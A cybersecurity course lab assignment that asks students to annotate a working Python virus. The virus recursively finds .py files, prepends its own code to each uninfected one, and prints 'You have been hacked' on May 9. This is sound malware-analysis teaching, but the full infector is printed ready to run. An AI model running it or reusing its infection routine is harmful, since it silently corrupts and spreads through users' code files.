# Ops Challenge: Python Malware Analysis

## Overview

The ability to read code written by others is a valuable skill to carry into your new career. Today you will analyze a malicious script written in Python and submit an interpreted version of the file with comments.

## Scenario

Last week, a GlobeX engineer was terminated from the organization under unpleasant circumstances. This morning, your service desk team responded to a ticket from the engineering department that their Python script repository had been tampered with, with the words "You have been hacked" written and saved into the scripts themselves. The service desk team also noted that the system clocks had been tampered with on various engineering computers an incorrectly set to May 9. After a careful review of system logs you find that the below script was executed with administrator privilege on various engineering systems.

The GlobeX board of directors has asked you to analyze the contents of this script and explain in plain terms what the script does.

## Objectives

Copy the below Python script to your public GitHub repo. Do not execute this script in your Ubuntu VM used for class. If you wish to execute this script, either backup your VM using VirtualBox Snapshot or create a separate VM for testing.

```python
#!/usr/bin/python3
import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()

```

Perform an analysis of the Python-based code.

- Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
- Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
- Insert comments above the final three lines explaining how the functions are called and what this script appears to do.

## Stretch Goals (Optional Objectives)

Pursue stretch goals if you are a more advanced user or have remaining lab time.

In your submission, include comments towards the bottom explaining the below:

- Identify all the core Python/coding tools used by this script, e.g. functions.
- What kind of malware is this? Define this type of malware in your own words.
- How well is this code written? Would you have done something differently to achieve the same objective?

## Submission Instructions

- When you are ready to submit your shell script for grading, ACP it from VS Code to your **public** [GitHub](https://github.com/){:target="_blank"} repository. Name the file according to your course code and assignment, e.g. `ops-301d1: Challenge 01`.
- Copy the URL to your GitHub file and paste below as your submission. Add a comment in your Canvas assignment which includes the following:
  - A question within the context of today's lab assignment
  - An observation about the lab assignment, or related 'Ah-hah!' moment
  - How long you spent working on this assignment
